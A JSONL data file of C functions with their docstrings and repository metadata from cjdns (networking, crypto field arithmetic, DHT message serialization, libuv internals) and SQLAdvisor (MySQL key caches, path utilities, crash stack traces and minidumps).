{"docstring": "/* This condition variable implementation is based on the SetEvent solution\n * (section 3.2) at http://www.cs.wustl.edu/~schmidt/win32-cv-1.html\n * We could not use the SignalObjectAndWait solution (section 3.4) because\n * it want the 2nd argument (type uv_mutex_t) of uv_cond_wait() and\n * uv_cond_timedwait() to be HANDLEs, but we use CRITICAL_SECTIONs.\n */\n", "func_signal": "static int uv_cond_fallback_init(uv_cond_t* cond)", "code": "{\n  int err;\n\n  /* Initialize the count to 0. */\n  cond->fallback.waiters_count = 0;\n\n  InitializeCriticalSection(&cond->fallback.waiters_count_lock);\n\n  /* Create an auto-reset event. */\n  cond->fallback.signal_event = CreateEvent(NULL,  /* no security */\n                                            FALSE, /* auto-reset event */\n                                            FALSE, /* non-signaled initially */\n                                            NULL); /* unnamed */\n  if (!cond->fallback.signal_event) {\n    err = GetLastError();\n    goto error2;\n  }\n\n  /* Create a manual-reset event. */\n  cond->fallback.broadcast_event = CreateEvent(NULL,  /* no security */\n                                               TRUE,  /* manual-reset */\n                                               FALSE, /* non-signaled */\n                                               NULL); /* unnamed */\n  if (!cond->fallback.broadcast_event) {\n    err = GetLastError();\n    goto error;\n  }\n\n  return 0;\n\nerror:\n  CloseHandle(cond->fallback.signal_event);\nerror2:\n  DeleteCriticalSection(&cond->fallback.waiters_count_lock);\n  return uv_translate_sys_error(err);\n}", "path": "cjdns/node_build/dependencies/libuv/src/win/thread.c", "commit_date": "2016-02-19 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/*\nh = f + g\nCan overlap h with f or g.\n\nPreconditions:\n   |f| bounded by 1.1*2^25,1.1*2^24,1.1*2^25,1.1*2^24,etc.\n   |g| bounded by 1.1*2^25,1.1*2^24,1.1*2^25,1.1*2^24,etc.\n\nPostconditions:\n   |h| bounded by 1.1*2^26,1.1*2^25,1.1*2^26,1.1*2^25,etc.\n*/\n", "func_signal": "void fe_add(fe h,const fe f,const fe g)", "code": "{\n  crypto_int32 f0 = f[0];\n  crypto_int32 f1 = f[1];\n  crypto_int32 f2 = f[2];\n  crypto_int32 f3 = f[3];\n  crypto_int32 f4 = f[4];\n  crypto_int32 f5 = f[5];\n  crypto_int32 f6 = f[6];\n  crypto_int32 f7 = f[7];\n  crypto_int32 f8 = f[8];\n  crypto_int32 f9 = f[9];\n  crypto_int32 g0 = g[0];\n  crypto_int32 g1 = g[1];\n  crypto_int32 g2 = g[2];\n  crypto_int32 g3 = g[3];\n  crypto_int32 g4 = g[4];\n  crypto_int32 g5 = g[5];\n  crypto_int32 g6 = g[6];\n  crypto_int32 g7 = g[7];\n  crypto_int32 g8 = g[8];\n  crypto_int32 g9 = g[9];\n  crypto_int32 h0 = f0 + g0;\n  crypto_int32 h1 = f1 + g1;\n  crypto_int32 h2 = f2 + g2;\n  crypto_int32 h3 = f3 + g3;\n  crypto_int32 h4 = f4 + g4;\n  crypto_int32 h5 = f5 + g5;\n  crypto_int32 h6 = f6 + g6;\n  crypto_int32 h7 = f7 + g7;\n  crypto_int32 h8 = f8 + g8;\n  crypto_int32 h9 = f9 + g9;\n  h[0] = h0;\n  h[1] = h1;\n  h[2] = h2;\n  h[3] = h3;\n  h[4] = h4;\n  h[5] = h5;\n  h[6] = h6;\n  h[7] = h7;\n  h[8] = h8;\n  h[9] = h9;\n}", "path": "cjdns/crypto/sign/fe_add.c", "commit_date": "2020-08-02 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "// Forward from switch pinger directly to core.\n", "func_signal": "static Iface_DEFUN incomingFromSwitchPinger(struct Message* msg, struct Iface* switchPingerIf)", "code": "{\n    struct ControlHandler_pvt* ch =\n        Identity_containerOf(switchPingerIf, struct ControlHandler_pvt, pub.switchPingerIf);\n    return Iface_next(&ch->pub.coreIf, msg);\n}", "path": "cjdns/net/ControlHandler.c", "commit_date": "2020-12-24 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/*--------------------Interface--------------------*/\n", "func_signal": "void SerializationModule_register(struct DHTModuleRegistry* registry,\n                                  struct Log* logger,\n                                  struct Allocator* allocator)", "code": "{\n    struct SerializationModule_context* context =\n        Allocator_malloc(allocator, sizeof(struct SerializationModule_context));\n    Bits_memcpy(context, (&(struct SerializationModule_context) {\n        .module = {\n            .name = \"SerializationModule\",\n            .context = context,\n            .handleIncoming = handleIncoming,\n            .handleOutgoing = handleOutgoing\n        },\n        .logger = logger\n    }), sizeof(struct SerializationModule_context));\n\n    DHTModuleRegistry_register(&(context->module), registry);\n}", "path": "cjdns/dht/SerializationModule.c", "commit_date": "2020-06-24 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/**\n * Take an outgoing message and serialize the bencoded message.\n *\n * @see DHTModule->handleOutgoing in DHTModules.h\n */\n", "func_signal": "static int handleOutgoing(struct DHTMessage* message,\n                          void* vcontext)", "code": "{\n   // This is always at the end of the message.\n    Assert_true(!message->binMessage->length);\n    Assert_true(!((uintptr_t)message->binMessage->bytes % 4) || !\"alignment fault0\");\n\n    if (Dict_getStringC(message->asDict, \"q\")) {\n        String* txid = Dict_getStringC(message->asDict, \"txid\");\n        Assert_true(txid);\n        String* newTxid = String_newBinary(NULL, txid->len + 2, message->allocator);\n        newTxid->bytes[0] = '0';\n        newTxid->bytes[1] = '0';\n        Bits_memcpy(&newTxid->bytes[2], txid->bytes, txid->len);\n        Dict_putStringC(message->asDict, \"txid\", newTxid, message->allocator);\n    }\n\n    Er_assert(BencMessageWriter_write(message->asDict, message->binMessage));\n\n    Assert_true(!((uintptr_t)message->binMessage->bytes % 4) || !\"alignment fault\");\n\n    return 0;\n}", "path": "cjdns/dht/SerializationModule.c", "commit_date": "2020-06-24 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/*\n * One-time intialization code for functionality defined in util.c.\n */\n", "func_signal": "void uv__util_init()", "code": "{\n  LARGE_INTEGER perf_frequency;\n\n  /* Initialize process title access mutex. */\n  InitializeCriticalSection(&process_title_lock);\n\n  /* Retrieve high-resolution timer frequency. */\n  if (QueryPerformanceFrequency(&perf_frequency))\n    hrtime_frequency_ = (double) perf_frequency.QuadPart / (double) NANOSEC;\n  else\n    hrtime_frequency_= 0;\n}", "path": "cjdns/node_build/dependencies/libuv/src/win/util.c", "commit_date": "2018-05-31 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/**\n * Take an incoming message and deserialize the bencoded message.\n *\n * @see DHTModule->handleIncoming in DHTModules.h\n */\n", "func_signal": "static int handleIncoming(struct DHTMessage* message,\n                          void* vcontext)", "code": "{\n    struct SerializationModule_context* context = vcontext;\n    const char* err =\n        BencMessageReader_readNoExcept(message->binMessage, message->allocator, &message->asDict);\n    if (err) {\n        Log_info(context->logger, \"Failed to parse message [%s]\", err);\n        return -2;\n    }\n    if (message->binMessage->length) {\n        Log_info(context->logger, \"Message contains [%d] bytes of crap at the end\",\n                 (int)message->binMessage->length);\n    }\n\n    String* q = Dict_getStringC(message->asDict, \"q\");\n    String* txid = Dict_getStringC(message->asDict, \"txid\");\n    if (!txid) {\n        Log_info(context->logger, \"query with no txid\");\n        return -2;\n    }\n    if (!q) {\n        if (txid->len < 2 || txid->bytes[0] != '0' || txid->bytes[1] != '0') {\n            // spammy\n            //Log_debug(context->logger, \"reply txid which is not from old pathfinder\");\n            return -2;\n        }\n        String* newTxid = String_newBinary(&txid->bytes[2], txid->len - 2, message->allocator);\n        Dict_putStringC(message->asDict, \"txid\", newTxid, message->allocator);\n    }\n\n    return 0;\n}", "path": "cjdns/dht/SerializationModule.c", "commit_date": "2020-06-24 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/** See: SearchStore.h */\n", "func_signal": "struct SearchStore_Search* SearchStore_newSearch(uint8_t searchTarget[16],\n                                                 struct SearchStore* store,\n                                                 struct Allocator* alloc)", "code": "{\n    struct SearchStore_Search_pvt* search =\n        Allocator_clone(alloc, (&(struct SearchStore_Search_pvt) {\n            .pub = {\n                .callbackContext = NULL,\n                .store = store,\n                .alloc = alloc\n            }\n        }));\n    Bits_memcpy(search->searchTarget, searchTarget, Address_SEARCH_TARGET_SIZE);\n\n    return &search->pub;\n}", "path": "cjdns/dht/dhtcore/SearchStore.c", "commit_date": "2017-01-13 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/* Tun Configurator for NetBSD. */\n", "func_signal": "Er_DEFUN(struct Iface* TUNInterface_new(const char* interfaceName,\n                                   char assignedInterfaceName[TUNInterface_IFNAMSIZ],\n                                   int isTapMode,\n                                   struct EventBase* base,\n                                   struct Log* logger,\n                                   struct Allocator* alloc))", "code": "{\n    if (isTapMode) { Er_raise(alloc, \"tap mode not supported on this platform\"); }\n    int err;\n    char file[TUNInterface_IFNAMSIZ];\n    int i;\n    int ppa = -1; // to store the tunnel device index\n    int tunFd = -1;\n    if (interfaceName && strlen(interfaceName) > 3 && !strncmp(interfaceName, \"tun\", 3)) {\n        snprintf(file, TUNInterface_IFNAMSIZ, \"/dev/%s\", interfaceName);\n        tunFd = open(file, O_RDWR);\n    } else {\n        for (ppa = 0;tunFd == -1 && ppa < 99;ppa++) {\n            snprintf(file, TUNInterface_IFNAMSIZ, \"/dev/tun%d\", ppa);\n            tunFd = open(file, O_RDWR);\n        }\n    }\n    if (tunFd < 0 ) {\n        err = errno;\n        close(tunFd);\n        Er_raise(alloc, \"%s [%s]\", \"open(\\\"/dev/tunX\\\")\", strerror(err));\n    }\n/* from the NetBSD tun man page:\n     TUNSIFHEAD  The argument should be a pointer to an int; a non-zero value\n                 turns off ``link-layer'' mode, and enables ``multi-af'' mode,\n                 where every packet is preceded with a four byte address\n                 family.\n*/\n    i = 2;\n    if (ioctl(tunFd, TUNSIFHEAD, &i) == -1) {\n        err = errno;\n        close(tunFd);\n        Er_raise(alloc, \"%s [%s]\", \"ioctl(tunFd,TUNSIFHEAD,&2)\", strerror(err));\n    }\n    // Since devices are numbered rather than named, it's not possible to have tun0 and cjdns0\n    // so we'll skip the pretty names and call everything tunX\n    if (assignedInterfaceName) {\n        if (ppa == -1) {\n            snprintf(assignedInterfaceName, TUNInterface_IFNAMSIZ, \"%s\", interfaceName);\n        } else {\n            snprintf(assignedInterfaceName, TUNInterface_IFNAMSIZ, \"tun%d\", ppa);\n        }\n    }\n    struct Pipe* p = Er(Pipe_forFd(tunFd, false, base, logger, alloc));\n\n    struct BSDMessageTypeWrapper* bmtw = BSDMessageTypeWrapper_new(alloc, logger);\n    Iface_plumb(&p->iface, &bmtw->wireSide);\n    Er_ret(&bmtw->inside);\n}", "path": "cjdns/interface/tuntap/TUNInterface_netbsd.c", "commit_date": "2020-04-28 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/* Bind a server to each address that getaddrinfo() reported. */\n", "func_signal": "static void do_bind(uv_getaddrinfo_t *req, int status, struct addrinfo *addrs)", "code": "{\n  char addrbuf[INET6_ADDRSTRLEN + 1];\n  unsigned int ipv4_naddrs;\n  unsigned int ipv6_naddrs;\n  server_state *state;\n  server_config *cf;\n  struct addrinfo *ai;\n  const void *addrv;\n  const char *what;\n  uv_loop_t *loop;\n  server_ctx *sx;\n  unsigned int n;\n  int err;\n  union {\n    struct sockaddr addr;\n    struct sockaddr_in addr4;\n    struct sockaddr_in6 addr6;\n  } s;\n\n  state = CONTAINER_OF(req, server_state, getaddrinfo_req);\n  loop = state->loop;\n  cf = &state->config;\n\n  if (status < 0) {\n    pr_err(\"getaddrinfo(\\\"%s\\\"): %s\", cf->bind_host, uv_strerror(status));\n    uv_freeaddrinfo(addrs);\n    return;\n  }\n\n  ipv4_naddrs = 0;\n  ipv6_naddrs = 0;\n  for (ai = addrs; ai != NULL; ai = ai->ai_next) {\n    if (ai->ai_family == AF_INET) {\n      ipv4_naddrs += 1;\n    } else if (ai->ai_family == AF_INET6) {\n      ipv6_naddrs += 1;\n    }\n  }\n\n  if (ipv4_naddrs == 0 && ipv6_naddrs == 0) {\n    pr_err(\"%s has no IPv4/6 addresses\", cf->bind_host);\n    uv_freeaddrinfo(addrs);\n    return;\n  }\n\n  state->servers =\n      xmalloc((ipv4_naddrs + ipv6_naddrs) * sizeof(state->servers[0]));\n\n  n = 0;\n  for (ai = addrs; ai != NULL; ai = ai->ai_next) {\n    if (ai->ai_family != AF_INET && ai->ai_family != AF_INET6) {\n      continue;\n    }\n\n    if (ai->ai_family == AF_INET) {\n      s.addr4 = *(const struct sockaddr_in *) ai->ai_addr;\n      s.addr4.sin_port = htons(cf->bind_port);\n      addrv = &s.addr4.sin_addr;\n    } else if (ai->ai_family == AF_INET6) {\n      s.addr6 = *(const struct sockaddr_in6 *) ai->ai_addr;\n      s.addr6.sin6_port = htons(cf->bind_port);\n      addrv = &s.addr6.sin6_addr;\n    } else {\n      UNREACHABLE();\n    }\n\n    if (uv_inet_ntop(s.addr.sa_family, addrv, addrbuf, sizeof(addrbuf))) {\n      UNREACHABLE();\n    }\n\n    sx = state->servers + n;\n    sx->loop = loop;\n    sx->idle_timeout = state->config.idle_timeout;\n    CHECK(0 == uv_tcp_init(loop, &sx->tcp_handle));\n\n    what = \"uv_tcp_bind\";\n    err = uv_tcp_bind(&sx->tcp_handle, &s.addr, 0);\n    if (err == 0) {\n      what = \"uv_listen\";\n      err = uv_listen((uv_stream_t *) &sx->tcp_handle, 128, on_connection);\n    }\n\n    if (err != 0) {\n      pr_err(\"%s(\\\"%s:%hu\\\"): %s\",\n             what,\n             addrbuf,\n             cf->bind_port,\n             uv_strerror(err));\n      while (n > 0) {\n        n -= 1;\n        uv_close((uv_handle_t *) (state->servers + n), NULL);\n      }\n      break;\n    }\n\n    pr_info(\"listening on %s:%hu\", addrbuf, cf->bind_port);\n    n += 1;\n  }\n\n  uv_freeaddrinfo(addrs);\n}", "path": "cjdns/node_build/dependencies/libuv/samples/socks5-proxy/server.c", "commit_date": "2014-02-23 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/*\nr = p - q\n*/\n", "func_signal": "void ge_sub(ge_p1p1 *r,const ge_p3 *p,const ge_cached *q)", "code": "{\n  fe t0;\n#include \"ge_sub.h\"\n}", "path": "cjdns/crypto/sign/ge_sub.c", "commit_date": "2020-08-02 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/**\n * Handle an incoming control message from a switch.\n *\n * @param context the ducttape context.\n * @param message the control message, this should be alligned on the beginning of the content,\n *                that is to say, after the end of the switch header.\n * @param switchHeader the header.\n * @param switchIf the interface which leads to the switch.\n * @param isFormV8 true if the control message is in the form specified by protocol version 8+\n */\n", "func_signal": "static Iface_DEFUN incomingFromCore(struct Message* msg, struct Iface* coreIf)", "code": "{\n    struct ControlHandler_pvt* ch = Identity_check((struct ControlHandler_pvt*) coreIf);\n\n    struct RouteHeader routeHdr;\n    Er_assert(Message_epop(msg, &routeHdr, RouteHeader_SIZE));\n    uint8_t labelStr[20];\n    uint64_t label = Endian_bigEndianToHost64(routeHdr.sh.label_be);\n    AddrTools_printPath(labelStr, label);\n    // happens in benchmark\n    // Log_debug(ch->log, \"ctrl packet from [%s]\", labelStr);\n\n    if (msg->length < 4 + Control_Header_SIZE) {\n        Log_info(ch->log, \"DROP runt ctrl packet from [%s]\", labelStr);\n        return Error(RUNT);\n    }\n\n    Assert_true(routeHdr.flags & RouteHeader_flags_CTRLMSG);\n\n    if (Checksum_engine_be(msg->bytes, msg->length)) {\n        Log_info(ch->log, \"DROP ctrl packet from [%s] with invalid checksum\", labelStr);\n        return Error(INVALID);\n    }\n\n    struct Control* ctrl = (struct Control*) msg->bytes;\n\n    if (ctrl->header.type_be == Control_ERROR_be) {\n        return handleError(msg, ch, label, labelStr, &routeHdr);\n\n    } else if (ctrl->header.type_be == Control_KEYPING_be\n            || ctrl->header.type_be == Control_PING_be)\n    {\n        return handlePing(msg, ch, label, labelStr, ctrl->header.type_be);\n\n    } else if (ctrl->header.type_be == Control_KEYPONG_be\n            || ctrl->header.type_be == Control_PONG_be)\n    {\n        Log_debug(ch->log, \"got switch pong from [%s]\", labelStr);\n        Er_assert(Message_epush(msg, &routeHdr, RouteHeader_SIZE));\n        return Iface_next(&ch->pub.switchPingerIf, msg);\n\n    } else if (ctrl->header.type_be == Control_GETSNODE_QUERY_be) {\n        return handleGetSnodeQuery(msg, ch, label, labelStr);\n\n    } else if (ctrl->header.type_be == Control_GETSNODE_REPLY_be\n            || ctrl->header.type_be == Control_RPATH_REPLY_be)\n    {\n        Log_debug(ch->log, \"got %s REPLY from [%s]\",\n            (ctrl->header.type_be == Control_GETSNODE_REPLY_be) ? \"GETSNODE\" : \"RPATH\",\n            labelStr);\n        Er_assert(Message_epush(msg, &routeHdr, RouteHeader_SIZE));\n        Er_assert(Message_epush32be(msg, 0xffffffff));\n        Er_assert(Message_epush32be(msg, PFChan_Core_CTRL_MSG));\n        return Iface_next(&ch->eventIf, msg);\n\n    } else if (ctrl->header.type_be == Control_RPATH_QUERY_be) {\n        return handleRPathQuery(msg, ch, label, labelStr);\n    }\n\n    Log_info(ch->log, \"DROP control packet of unknown type from [%s], type [%d]\",\n             labelStr, Endian_bigEndianToHost16(ctrl->header.type_be));\n\n    return Error(INVALID);\n}", "path": "cjdns/net/ControlHandler.c", "commit_date": "2020-12-24 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/*\n  Free a SAFE_HASH_ENTRY\n\n  This function is called by the hash object on delete\n*/\n", "func_signal": "static void safe_hash_entry_free(SAFE_HASH_ENTRY *entry)", "code": "{\n  DBUG_ENTER(\"free_assign_entry\");\n  my_free(entry);\n  DBUG_VOID_RETURN;\n}", "path": "SQLAdvisor/mysys/mf_keycaches.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  \"weight\" must be [MY_UCA_MAXWEIGHT_TO_DUMP+1] elements long\n*/\n", "func_signal": "static size_t\nnormalize_weight(MY_UCA_ITEM *item, size_t level,\n                 uint16 *weight, size_t weight_elements)", "code": "{\n  size_t num, i;\n  \n  memset(weight, 0, weight_elements * sizeof(*weight));\n\n  /*\n    Copy non-zero weights only. For example:\n    \n    [.17A6.0020.0004.00DF][.0000.015F.0004.00DF][.17A6.0020.001F.00DF]\n    \n    makes [17A6][0000][17A6] on the primary level\n    \n    pack it to [17A6][17A7]\n  */\n  \n  for (num= 0, i= 0; i < item->num && i < MY_UCA_MAXWEIGHT_TO_DUMP; i++)\n  {\n    if (item->weight[level][i])\n    {\n      weight[num]= item->weight[level][i];\n#ifdef INVERT_TERTIARY_WEIGHTS\n      if (level == 2)\n      {\n        /* \n          Invert tertiary weights to sort upper case letters\n          before their lower case counterparts.\n        */\n        if (weight[num] >= 0x20)\n          fprintf(stderr, \"Tertiary weight is too big: %02X\\n\", weight[num]);\n        weight[num]= (uint) (0x20) - weight[num];\n      }\n#endif\n      num++;\n    }\n  }\n  return num;\n}", "path": "SQLAdvisor/strings/uca-dump.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Get a key cache to be used for a specific table.\n\n  SYNOPSIS\n    multi_key_cache_search()\n    key\t\t\t\tkey to find (usually table path)\n    uint length\t\t\tLength of key.\n\n  NOTES\n    This function is coded in such a way that we will return the\n    default key cache even if one never called multi_keycache_init.\n    This will ensure that it works with old MyISAM clients.\n\n  RETURN\n    key cache to use\n*/\n", "func_signal": "KEY_CACHE *multi_key_cache_search(uchar *key, uint length)", "code": "{\n  if (!key_cache_hash.hash.records)\n    return dflt_key_cache;\n  return (KEY_CACHE*) safe_hash_search(&key_cache_hash, key, length);\n}", "path": "SQLAdvisor/mysys/mf_keycaches.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Init a SAFE_HASH object\n\n  SYNOPSIS\n    safe_hash_init()\n    hash\t\tsafe_hash handler\n    elements\t\tExpected max number of elements\n    default_value\tdefault value\n\n  NOTES\n    In case of error we set hash->default_value to 0 to allow one to call\n    safe_hash_free on an object that couldn't be initialized.\n\n  RETURN\n    0  ok\n    1  error\n*/\n", "func_signal": "static my_bool safe_hash_init(SAFE_HASH *hash, uint elements,\n\t\t\t      uchar *default_value)", "code": "{\n  DBUG_ENTER(\"safe_hash\");\n  if (my_hash_init(&hash->hash, &my_charset_bin, elements,\n                   0, 0, (my_hash_get_key) safe_hash_entry_get,\n                   (void (*)(void*)) safe_hash_entry_free, 0))\n  {\n    hash->default_value= 0;\n    DBUG_RETURN(1);\n  }\n  my_rwlock_init(&hash->mutex, 0);\n  hash->default_value= default_value;\n  hash->root= 0;\n  DBUG_RETURN(0);\n}", "path": "SQLAdvisor/mysys/mf_keycaches.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* Gets current working directory in buff.\n\n  SYNPOSIS\n    my_getwd()\n    buf\t\tBuffer to store result. Can be curr_dir[].\n    size\tSize of buffer\n    MyFlags\tFlags\n\n  NOTES\n    Directory is allways ended with FN_LIBCHAR\n\n  RESULT\n    0  ok\n    #  error\n*/\n", "func_signal": "int my_getwd(char * buf, size_t size, myf MyFlags)", "code": "{\n  char * pos;\n  DBUG_ENTER(\"my_getwd\");\n  DBUG_PRINT(\"my\",(\"buf: 0x%lx  size: %u  MyFlags %d\",\n                   (long) buf, (uint) size, MyFlags));\n\n  if (size < 1)\n    DBUG_RETURN(-1);\n\n  if (curr_dir[0])\t\t\t\t/* Current pos is saved here */\n    (void) strmake(buf,&curr_dir[0],size-1);\n  else\n  {\n#if defined(HAVE_GETCWD)\n    if (size < 2)\n      DBUG_RETURN(-1);\n    if (!getcwd(buf,(uint) (size-2)) && MyFlags & MY_WME)\n    {\n      char errbuf[MYSYS_STRERROR_SIZE];\n      my_errno=errno;\n      my_error(EE_GETWD, MYF(ME_BELL+ME_WAITTANG),\n               errno, my_strerror(errbuf, sizeof(errbuf), errno));\n      DBUG_RETURN(-1);\n    }\n#elif defined(HAVE_GETWD)\n    {\n      char pathname[MAXPATHLEN];\n      getwd(pathname);\n      strmake(buf,pathname,size-1);\n    }\n#else\n#error \"No way to get current directory\"\n#endif\n    if (*((pos=strend(buf))-1) != FN_LIBCHAR)  /* End with FN_LIBCHAR */\n    {\n      pos[0]= FN_LIBCHAR;\n      pos[1]=0;\n    }\n    (void) strmake(&curr_dir[0],buf, (size_t) (FN_REFLEN-1));\n  }\n  DBUG_RETURN(0);\n}", "path": "SQLAdvisor/mysys/my_getwd.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Appends directory to symbol path.\n*/\n", "func_signal": "static void add_to_symbol_path(char *path, size_t path_buffer_size, \n  char *dir, size_t dir_buffer_size)", "code": "{\n  strcat_s(dir, dir_buffer_size, \";\");\n  if (!strstr(path, dir))\n  {\n    strcat_s(path, path_buffer_size, dir);\n  }\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* Returns 1 if dirname is a hard path */\n", "func_signal": "int test_if_hard_path(register const char *dir_name)", "code": "{\n  if (dir_name[0] == FN_HOMELIB && dir_name[1] == FN_LIBCHAR)\n    return (home_dir != NullS && test_if_hard_path(home_dir));\n  if (dir_name[0] == FN_LIBCHAR)\n    return (TRUE);\n#ifdef FN_DEVCHAR\n  return (strchr(dir_name,FN_DEVCHAR) != 0);\n#else\n  return FALSE;\n#endif\n}", "path": "SQLAdvisor/mysys/my_getwd.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Test if a name contains an (absolute or relative) path.\n\n  SYNOPSIS\n    has_path()\n    name                The name to test.\n\n  RETURN\n    TRUE        name contains a path.\n    FALSE       name does not contain a path.\n*/\n", "func_signal": "my_bool has_path(const char *name)", "code": "{\n  return MY_TEST(strchr(name, FN_LIBCHAR)) \n#if FN_LIBCHAR != '/'\n    || MY_TEST(strchr(name,'/'))\n#endif\n#ifdef FN_DEVCHAR\n    || MY_TEST(strchr(name, FN_DEVCHAR))\n#endif\n    ;\n}", "path": "SQLAdvisor/mysys/my_getwd.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/**\n  Access the pages of this process through /proc/self/task/<tid>/mem\n  in order to safely print the contents of a memory address range.\n\n  @param  addr      The address at the start of the memory region.\n  @param  max_len   The length of the memory region.\n\n  @return Zero on success.\n*/\n", "func_signal": "static int safe_print_str(const char *addr, int max_len)", "code": "{\n  int fd;\n  pid_t tid;\n  off_t offset;\n  ssize_t nbytes= 0;\n  size_t total, count;\n  char buf[256];\n\n  tid= (pid_t) syscall(SYS_gettid);\n\n  sprintf(buf, \"/proc/self/task/%d/mem\", tid);\n\n  if ((fd= open(buf, O_RDONLY)) < 0)\n    return -1;\n\n  /* Ensure that off_t can hold a pointer. */\n  compile_time_assert(sizeof(off_t) >= sizeof(intptr));\n\n  total= max_len;\n  offset= (intptr) addr;\n\n  /* Read up to the maximum number of bytes. */\n  while (total)\n  {\n    count= MY_MIN(sizeof(buf), total);\n\n    if ((nbytes= pread(fd, buf, count, offset)) < 0)\n    {\n      /* Just in case... */\n      if (errno == EINTR)\n        continue;\n      else\n        break;\n    }\n\n    /* Advance offset into memory. */\n    total-= nbytes;\n    offset+= nbytes;\n    addr+= nbytes;\n\n    /* Output the printable characters. */\n    print_buffer(buf, nbytes);\n\n    /* Break if less than requested... */\n    if ((count - nbytes))\n      break;\n  }\n\n  /* Output a new line if something was printed. */\n  if (total != (size_t) max_len)\n    my_safe_printf_stderr(\"%s\", \"\\n\");\n\n  if (nbytes == -1)\n    my_safe_printf_stderr(\"Can't read from address %p\\n\", addr);\n\n  close(fd);\n\n  return 0;\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/* Produce a core for the thread */\n", "func_signal": "void my_write_core(int sig)", "code": "{\n  signal(sig, SIG_DFL);\n  pthread_kill(pthread_self(), sig);\n#if defined(P_MYID) && !defined(SCO)\n  /* On Solaris, the above kill is not enough */\n  sigsend(P_PID,P_MYID,sig);\n#endif\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
{"docstring": "/*\n  Write dump. The dump is created in current directory,\n  file name is constructed from executable name plus\n  \".dmp\" extension\n*/\n", "func_signal": "void my_write_core(int unused)", "code": "{\n  char path[MAX_PATH];\n  char dump_fname[MAX_PATH]= \"core.dmp\";\n  MINIDUMP_EXCEPTION_INFORMATION info;\n  HANDLE hFile;\n\n  if(!exception_ptrs)\n    return;\n\n  info.ExceptionPointers= exception_ptrs;\n  info.ClientPointers= FALSE;\n  info.ThreadId= GetCurrentThreadId();\n\n  if(GetModuleFileName(NULL, path, sizeof(path)))\n  {\n    _splitpath(path, NULL, NULL,dump_fname,NULL);\n    strncat(dump_fname, \".dmp\", sizeof(dump_fname));\n  }\n\n  hFile= CreateFile(dump_fname, GENERIC_WRITE, 0, 0, CREATE_ALWAYS,\n    FILE_ATTRIBUTE_NORMAL, 0);\n  if(hFile)\n  {\n    /* Create minidump */\n    if(MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),\n      hFile, MiniDumpNormal, &info, 0, 0))\n    {\n      my_safe_printf_stderr(\"Minidump written to %s\\n\",\n                            _fullpath(path, dump_fname, sizeof(path)) ?\n                            path : dump_fname);\n    }\n    else\n    {\n      my_safe_printf_stderr(\"MiniDumpWriteDump() failed, last error %u\\n\",\n                            (uint) GetLastError());\n    }\n    CloseHandle(hFile);\n  }\n  else\n  {\n    my_safe_printf_stderr(\"CreateFile(%s) failed, last error %u\\n\",\n                          dump_fname, (uint) GetLastError());\n  }\n}", "path": "SQLAdvisor/mysys/stacktrace.c", "commit_date": "2017-03-06 00:00:00", "repo_name": "Meituan-Dianping/SQLAdvisor", "stars": 5450, "license": "gpl-2.0", "language": "c", "size": 20412}
